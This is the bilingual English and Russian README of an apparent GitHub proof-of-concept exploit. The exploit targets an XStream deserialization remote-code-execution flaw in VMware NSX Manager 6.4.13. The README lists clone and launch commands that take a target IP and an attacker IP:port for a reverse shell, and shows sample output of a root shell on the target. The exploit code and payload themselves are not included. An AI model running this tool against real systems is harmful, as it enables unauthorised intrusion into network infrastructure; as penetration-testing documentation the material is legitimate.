
# EN
**GenVMNSXDeserExec** is a PoC exploit targeting the XStream deserialization vulnerability in VMware NSX Manager. The vulnerability allows for remote code execution (RCE) on the affected versions of the VMware NSX Manager platform.

This PoC leverages an XML payload to exploit the XStream deserialization flaw in VMware NSX Manager. Upon successful exploitation, the payload creates a reverse shell connection to the attacker's machine, allowing full control of the target system. This tool is designed for educational purposes and should only be used in environments where you have explicit permission.

## Affected Version

- **VMware NSX Manager 6.4.13-19307994**


## Features

- Remote Code Execution (RCE) on vulnerable VMware NSX Manager.
- Customizable reverse shell connection to attacker’s machine.
- Easy-to-use command-line interface.

## Usage

### Prerequisites

- Python 3.x installed on your system.
- Access to a vulnerable VMware NSX Manager instance.
- An open port to receive reverse shell connections.

## Installation

Clone the repository and navigate to the project directory:

```bash
git clone https://github.com/geniuszly/GenVMNSXDeserExec
cd GenVMNSXDeserExec
```

## Running the Exploit

The exploit requires two parameters: the target IP address and the attacker's IP and port for the reverse shell connection. The format is as follows:

```bash
python3 GenVMNSXDeserExec.py <target_ip> <attacker_ip:port>
```

## Example

```bash
python3 GenVMNSXDeserExec.py 192.168.1.100 172.16.0.10:4444
```

This will start a listener on port `4444` and attempt to exploit the target at `192.168.1.100`. If successful, a reverse shell will be opened to the attacker's machine.

### Example output
```
[+] Запуск прослушивателя на порту 4444
[+] Отправка эксплойта на 192.168.1.100
[+] Эксплойт успешно отправлен, ожидайте обратного соединения.
[+] Получено подключение от 192.168.1.100
[+] Взаимодействие с обратным шеллом!
```
После успешного запуска эксплойта и получения соединения с целевым хостом будет открыт интерактивный Telnet-сессия, которая позволит выполнять команды на целевом сервере:
```
$ whoami
root
$ hostname
nsx-vmware-target
$ ls /root
flag.txt
$ cat /root/flag.txt
Congratulations, you've exploited the target!
```

## Notes

- Ensure that your firewall and network settings allow for reverse shell connections on the specified port.
- This PoC should only be used for educational and ethical purposes. Unauthorized use against systems you do not own or have permission to test is illegal and unethical.

## Disclaimer

This tool is for educational purposes only. The author is not responsible for any misuse or damage caused by this tool.


# GenVMNSXDeserExec

## Обзор

**GenVMNSXDeserExec** — это PoC эксплойт, нацеленный на уязвимость десериализации XStream в VMware NSX Manager. Данная уязвимость позволяет удаленно выполнить код (RCE) на уязвимых версиях платформы VMware NSX Manager.

Этот PoC использует XML-пейлоад для эксплуатации уязвимости десериализации XStream в VMware NSX Manager. При успешной эксплуатации пейлоад создает обратное соединение (reverse shell) на машину атакующего, предоставляя полный доступ к системе цели. Инструмент разработан для образовательных целей и должен использоваться только в средах, где у вас есть явное разрешение.

## Уязвимые версии

- **VMware NSX Manager 6.4.13-19307994**

## Возможности

- Выполнение удаленного кода (RCE) на уязвимом VMware NSX Manager.
- Настраиваемое обратное соединение на машину атакующего.
- Удобный интерфейс командной строки.

## Использование

### Требования

- Установленный Python 3.x.
- Доступ к уязвимой системе VMware NSX Manager.
- Открытый порт для приема обратного соединения (reverse shell).

## Установка

Клонируйте репозиторий и перейдите в каталог проекта:

```bash
git clone https://github.com/geniuszly/GenVMNSXDeserExec
cd GenVMNSXDeserExec
```

## Запуск эксплойта

Для работы эксплойта требуется указать два параметра: IP-адрес цели и IP-адрес и порт атакующего для обратного соединения. Формат:

```bash
python3 GenVMNSXDeserExec.py <ip_цели> <ip_атакующего:порт>
```

## Пример

```bash
python3 GenVMNSXDeserExec.py 192.168.1.100 172.16.0.10:4444
```
Это запустит прослушиватель на порту `4444` и попытается эксплуатировать цель по адресу `192.168.1.100`. В случае успешной эксплуатации на машине атакующего будет открыт обратный шелл.

### Пример вывода
```
[+] Запуск прослушивателя на порту 4444
[+] Отправка эксплойта на 192.168.1.100
[+] Эксплойт успешно отправлен, ожидайте обратного соединения.
[+] Получено подключение от 192.168.1.100
[+] Взаимодействие с обратным шеллом!
```
После успешного запуска эксплойта и получения соединения с целевым хостом будет открыт интерактивный Telnet-сессия, которая позволит выполнять команды на целевом сервере:
```
$ whoami
root
$ hostname
nsx-vmware-target
$ ls /root
flag.txt
$ cat /root/flag.txt
Congratulations, you've exploited the target!
```



## Заметки

- Убедитесь, что настройки сети и файрвола позволяют подключение обратного соединения на указанный порт.
- Этот PoC следует использовать только в образовательных и этических целях. Неавторизованное использование против систем, которые вам не принадлежат или на которые у вас нет разрешения, является незаконным и неэтичным.

## Отказ от ответственности

Этот инструмент предназначен только для образовательных целей. Автор не несет ответственности за любое неправильное использование или ущерб, причиненный данным инструментом.
